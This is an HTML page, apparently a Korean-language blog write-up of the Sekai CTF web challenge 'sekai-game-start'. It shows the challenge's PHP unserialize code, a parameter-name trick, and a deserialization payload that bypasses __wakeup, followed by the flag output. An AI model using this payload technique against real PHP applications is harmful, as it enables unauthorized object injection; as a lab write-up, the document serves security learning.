@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='문제를 접속하면 아래의 php 코드가 주어진다. 해당 코드를 해석해보면 GET 방식으로 sekai_game.run을 실행하면 될 것으로 보였다. &amp;lt;?php include(&amp;#39;./flag.php&amp;#39;); class Sekai_Game{ public $start = True; public'><title>Sekai CTF sekai-game-start</title>
+
+<link rel='canonical' href='https://appealso.github.io/p/sekai-ctf-sekai-game-start/'>
+
+<link rel="stylesheet" href="/scss/style.min.775dbd4fd34fda61c5273b4bc3415f7c9666414fb6c40aab164a7ded4397da98.css">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-J2H7Y6XC3K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-J2H7Y6XC3K');
+</script><meta property='og:title' content='Sekai CTF sekai-game-start'>
+<meta property='og:description' content='문제를 접속하면 아래의 php 코드가 주어진다. 해당 코드를 해석해보면 GET 방식으로 sekai_game.run을 실행하면 될 것으로 보였다. &amp;lt;?php include(&amp;#39;./flag.php&amp;#39;); class Sekai_Game{ public $start = True; public'>
+<meta property='og:url' content='https://appealso.github.io/p/sekai-ctf-sekai-game-start/'>
+<meta property='og:site_name' content='SooHo&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Sekai CTF' /><meta property='article:tag' content='CTF' /><meta property='article:tag' content='WEBCTF' /><meta property='article:published_time' content='2022-10-22T19:30:27&#43;09:00'/><meta property='article:modified_time' content='2022-10-22T19:30:27&#43;09:00'/><meta property='og:image' content='https://appealso.github.io/p/sekai-ctf-sekai-game-start/sekaictf.png' />
+<meta name="twitter:title" content="Sekai CTF sekai-game-start">
+<meta name="twitter:description" content="문제를 접속하면 아래의 php 코드가 주어진다. 해당 코드를 해석해보면 GET 방식으로 sekai_game.run을 실행하면 될 것으로 보였다. &amp;lt;?php include(&amp;#39;./flag.php&amp;#39;); class Sekai_Game{ public $start = True; public"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://appealso.github.io/p/sekai-ctf-sekai-game-start/sekaictf.png' />
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-J2H7Y6XC3K"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-J2H7Y6XC3K', { 'anonymize_ip': false });
+}
+</script>
+
+    </head>
+    <body class="
+    article-page 
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            localStorage.setItem(colorSchemeKey, "light");
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        on-phone--column extended
+    
+">
+    
+        <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            
+            <figure class="site-avatar">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/IMG_hu741e5fcc8a8371ad3c512c4eac4a27a6_49324_300x0_resize_q75_box.JPG" width="300"
+                            height="353" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+
+                
+            </figure>
+            
+        
+        
+        <h1 class="site-name"><a href="/">SooHo&#39;s Blog</a></h1>
+        <h2 class="site-description">Security engineer and Developer</h2></header>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        
+    </ol>
+</aside>
+
+    
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/sekai-ctf-sekai-game-start/">
+                <img src="/p/sekai-ctf-sekai-game-start/sekaictf_hu2550f7ad8b351e6fa8038bce33594268_150813_800x0_resize_box_3.png"
+                        srcset="/p/sekai-ctf-sekai-game-start/sekaictf_hu2550f7ad8b351e6fa8038bce33594268_150813_800x0_resize_box_3.png 800w, /p/sekai-ctf-sekai-game-start/sekaictf_hu2550f7ad8b351e6fa8038bce33594268_150813_1600x0_resize_box_3.png 1600w"
+                        width="800" 
+                        height="200" 
+                        loading="lazy"
+                        alt="Featured image of post Sekai CTF sekai-game-start" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" style="background-color: #2a9d8f; color: #fff;">
+                CTF
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/sekai-ctf-sekai-game-start/">Sekai CTF sekai-game-start</a>
+    </h2>
+
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Oct 22, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    1 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <p>문제를 접속하면 아래의 php 코드가 주어진다. 해당 코드를 해석해보면
+GET 방식으로 sekai_game.run을 실행하면 될 것으로 보였다.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">include</span><span class="p">(</span><span class="s1">&#39;./flag.php&#39;</span><span class="p">);</span>
+<span class="k">class</span> <span class="nc">Sekai_Game</span><span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$start</span> <span class="o">=</span> <span class="k">True</span><span class="p">;</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">start</span> <span class="o">===</span> <span class="k">True</span><span class="p">){</span>
+            <span class="k">echo</span> <span class="s2">&#34;Sekai Game Start Here is your flag &#34;</span><span class="o">.</span><span class="nx">getenv</span><span class="p">(</span><span class="s1">&#39;FLAG&#39;</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">start</span><span class="o">=</span><span class="k">False</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;sekai_game.run&#39;</span><span class="p">])){</span>
+    <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;sekai_game.run&#39;</span><span class="p">]);</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>하지만 sekai_game.run을 GET 방식으로 요청할 경우 &ldquo;.&ldquo;을 &ldquo;_&ldquo;로 변경을 해버린다. 이것을 우회하기 위해 &ldquo;_&ldquo;를 사용하는 대신에 &ldquo;[&rdquo; (대괄호)를 넣어서 우회를 해야 한다.</p>
+<ul>
+<li>write-up을 보다보니 php의 8버전이전의 경우 대활호를 만나면 대괄호를 &ldquo;_&rdquo; (언더바)로 변경하고 나머지는 변경을 하지 않는다고 한다.</li>
+</ul>
+<p>이제 다음 문제는 Sekai_Game Class 에서 wake_up 함수를 우회해야한다. 이를 위해 관련 문서를 찾아 보았고, ?sekai[game.run=C:10:&ldquo;Sekai_Game&rdquo;:0:{} 과 같은 POC코드를 작성 할 수 있었다.</p>
+<ul>
+<li>참고: <a class="link" href="https://bugs.php.net/bug.php?id=81151"  target="_blank" rel="noopener"
+    >https://bugs.php.net/bug.php?id=81151</a></li>
+</ul>
+<p>작성한 코드를 실행하면 아래와 같은 화면이 나오면서 flag를 획득 할 수 있다.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">Warning</span><span class="o">:</span> <span class="nx">Insufficient</span> <span class="nx">data</span> <span class="k">for</span> <span class="nx">unserializing</span> <span class="o">-</span> <span class="mi">1</span> <span class="nx">required</span><span class="p">,</span> <span class="mi">1</span> <span class="nx">present</span> <span class="nx">in</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">html</span><span class="o">/</span><span class="nx">index</span><span class="o">.</span><span class="nx">php</span> <span class="nx">on</span> <span class="nx">line</span> <span class="mi">17</span>  
+<span class="nx">Sekai</span> <span class="nx">Game</span> <span class="nx">Start</span> <span class="nx">Here</span> <span class="nx">is</span> <span class="nx">your</span> <span class="nx">flag</span> <span class="nx">SEKAI</span><span class="p">{</span><span class="nx">W3lcome_T0_Our_universe</span><span class="p">}</span>  
+</code></pre></div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/sekai-ctf/">Sekai CTF</a>
+        
+            <a href="/tags/ctf/">CTF</a>
+        
+            <a href="/tags/webctf/">WEBCTF</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">Related contents</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/sekai-ctf-bottle-poem-write-up/">
+        
+        
+            <div class="article-image">
+                <img src="/p/sekai-ctf-bottle-poem-write-up/sekaictf.7e7c044d592d29c99b9899c4066e2532_hu2550f7ad8b351e6fa8038bce33594268_150813_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Sekai CTF Bottle-Poem Write Up"
+                        
+                        data-hash="md5-fnwETVktKcmbmJnEBm4lMg==">
+                
+            </div>
+        
+        <div class="article-details">
+            <h2 class="article-title">Sekai CTF Bottle-Poem Write Up</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/n00bzctf-reversing-encryption_with_matrices/">
+        
+        
+            <div class="article-image">
+                <img src="/p/n00bzctf-reversing-encryption_with_matrices/cover.8fbb065798b37fb4539bd9aef56e6809_hu9a07790b52a43b6c840a3a8793df70ef_7677_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post N00bzCTF [Reversing] - encryption_with_matrices"
+                        
+                        data-hash="md5-j7sGV5izf7RTm9mu9W5oCQ==">
+                
+            </div>
+        
+        <div class="article-details">
+            <h2 class="article-title">N00bzCTF [Reversing] - encryption_with_matrices</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/hack-the-box-crypto-android-in-the-middle/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hack-the-box-crypto-android-in-the-middle/cover.d501c41fb23501887c35324a9d654cf1_hu6c7d8e00816a314732898bca532296f9_14244_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Hack The Box - [Crypto] - Android-in-the-Middle"
+                        
+                        data-hash="md5-1QHEH7I1AYh8NTJKnWVM8Q==">
+                
+            </div>
+        
+        <div class="article-details">
+            <h2 class="article-title">Hack The Box - [Crypto] - Android-in-the-Middle</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/hack-the-box-misc-matrioshka-brain-matrioshka-brain/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hack-the-box-misc-matrioshka-brain-matrioshka-brain/cover.d501c41fb23501887c35324a9d654cf1_hu6c7d8e00816a314732898bca532296f9_14244_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Hack The Box - [MISC] -Matrioshka Brain Matrioshka Brain"
+                        
+                        data-hash="md5-1QHEH7I1AYh8NTJKnWVM8Q==">
+                
+            </div>
+        
+        <div class="article-details">
+            <h2 class="article-title">Hack The Box - [MISC] -Matrioshka Brain Matrioshka Brain</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/n00bzctf-crpyto-rsa/">
+        
+        
+            <div class="article-image">
+                <img src="/p/n00bzctf-crpyto-rsa/cover.8fbb065798b37fb4539bd9aef56e6809_hu9a07790b52a43b6c840a3a8793df70ef_7677_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post N00bzCTF - [Crpyto] - RSA"
+                        
+                        data-hash="md5-j7sGV5izf7RTm9mu9W5oCQ==">
+                
+            </div>
+        
+        <div class="article-details">
+            <h2 class="article-title">N00bzCTF - [Crpyto] - RSA</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "appealso-github-io" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (DISQUS) {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2022 SooHo&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        
+    </section>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1842197916935789" crossorigin="anonymous"></script>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
